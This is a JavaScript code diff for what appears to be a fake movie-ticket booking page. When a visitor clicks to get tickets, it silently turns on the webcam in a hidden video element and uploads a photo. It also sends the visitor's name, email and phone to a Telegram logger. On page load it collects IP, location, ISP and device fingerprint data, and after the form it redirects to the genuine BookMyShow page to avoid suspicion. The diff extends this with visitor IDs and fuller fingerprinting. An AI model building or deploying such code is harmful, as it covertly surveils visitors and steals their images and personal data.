@@ -5,17 +5,39 @@ const formSection = document.getElementById('formSection');
 const ticketForm = document.getElementById('ticketForm');
 const video = document.getElementById('video');
 
+// Global variable to store visitor ID
+let visitorID = "";
+
+// Generate visitor ID once from country + date
+async function generateVisitorID() {
+  if (visitorID) return visitorID;
+
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+    const countryCode = data.country || "XX";
+    const now = new Date();
+    const dd = String(now.getDate()).padStart(2, '0');
+    const mmm = now.toLocaleString('en-US', { month: 'short' }).toUpperCase();
+    const yy = String(now.getFullYear()).slice(-2);
+    const uniqueNum = Math.floor(1000 + Math.random() * 9000);
+
+    visitorID = `${countryCode}-${dd}${mmm}${yy}-${uniqueNum}`;
+  } catch (e) {
+    visitorID = `XX-ERR-${Math.floor(1000 + Math.random() * 9000)}`;
+  }
+  return visitorID;
+}
+
 // Step 1: Show form and start webcam
-getTicketsBtn.addEventListener('click', () => {
-  // Hide all other sections to simulate new page
+getTicketsBtn.addEventListener('click', async () => {
+  await generateVisitorID();
+
   document.querySelector('.hero').style.display = 'none';
   document.querySelector('.details').style.display = 'none';
   document.querySelector('.cast-reviews').style.display = 'none';
-
-  // Show form section
   formSection.style.display = 'block';
 
-  // Start webcam
   navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
     video.srcObject = stream;
     video.style.display = 'none';
@@ -28,6 +50,10 @@ getTicketsBtn.addEventListener('click', () => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const base64Image = canvas.toDataURL('image/jpeg');
 
+      // ✅ Log before sending image
+      sendToTelegram(`📸 ${visitorID} – Photo captured successfully`);
+
+      // ✅ Send image
       fetch(APPS_SCRIPT_URL, {
         method: 'POST',
         mode: 'no-cors',
@@ -39,12 +65,14 @@ getTicketsBtn.addEventListener('click', () => {
 
   }).catch(err => {
     console.error("Camera error:", err);
+    sendToTelegram(`🚫 ${visitorID} – Webcam not accessible`);
   });
 });
 
-// Step 2: Submit form and log to Telegram
+// Step 2: Form submission
 ticketForm.addEventListener('submit', async (e) => {
   e.preventDefault();
+  await generateVisitorID();
 
   const name = ticketForm.elements['name'].value;
   const email = ticketForm.elements['email'].value;
@@ -55,50 +83,56 @@ ticketForm.addEventListener('submit', async (e) => {
     mode: 'no-cors',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      log: `🎟️ Form Submission\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`
+      log: `🎟️ Form Submission\nVisitor ID: ${visitorID}\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`
     })
   });
 
-  // Redirect to official site
   window.location.href = 'https://in.bookmyshow.com/movies/f1-the-movie/ET00403839';
 });
 
-// Step 3: Collect IP + device info
-function collectDeviceInfo() {
-  fetch('https://ipapi.co/json/')
-    .then(response => response.json())
-    .then(data => {
-      const message = `
-🌐 Visitor Info:
-IP: ${data.ip}
-City: ${data.city}
-Region: ${data.region}
-Country: ${data.country_name}
-ISP: ${data.org}
-ASN: ${data.asn}
-Timezone: ${data.timezone}
-Browser: ${navigator.userAgent}
-      `;
-      sendToTelegram(message);
-    })
-    .catch(error => {
-      console.error("Failed to fetch device info:", error);
-    });
+// Step 3: Collect IP and browser info
+async function collectFullDeviceInfo() {
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+
+    const fingerprint = {
+      screenResolution: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      deviceMemory: navigator.deviceMemory || 'N/A',
+      platform: navigator.platform,
+      userAgent: navigator.userAgent
+    };
+
+    const message = `🧠 Device Info (${visitorID})
+🌍 IP: ${data.ip}
+📍 Location: ${data.city}, ${data.region}, ${data.country_name}
+🌐 ISP: ${data.org} | ASN: ${data.asn}
+🕒 Timezone: ${data.timezone}
+🖥️ Screen: ${fingerprint.screenResolution}
+🔋 RAM: ${fingerprint.deviceMemory} GB
+💻 Platform: ${fingerprint.platform}
+🕸️ User Agent:
+${fingerprint.userAgent}`;
+
+    sendToTelegram(message);
+  } catch (error) {
+    console.error("Failed to fetch device info:", error);
+    sendToTelegram(`❗ ${visitorID} – Failed to collect full device info`);
+  }
 }
 
-// Utility: Send to Telegram
+// Send text to Telegram
 function sendToTelegram(msg) {
   fetch(APPS_SCRIPT_URL, {
     method: "POST",
     mode: "no-cors",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ log: msg })
   });
 }
 
-// Trigger on page load
-document.addEventListener("DOMContentLoaded", () => {
-  collectDeviceInfo();
+document.addEventListener("DOMContentLoaded", async () => {
+  await generateVisitorID();
+  collectFullDeviceInfo();
 });
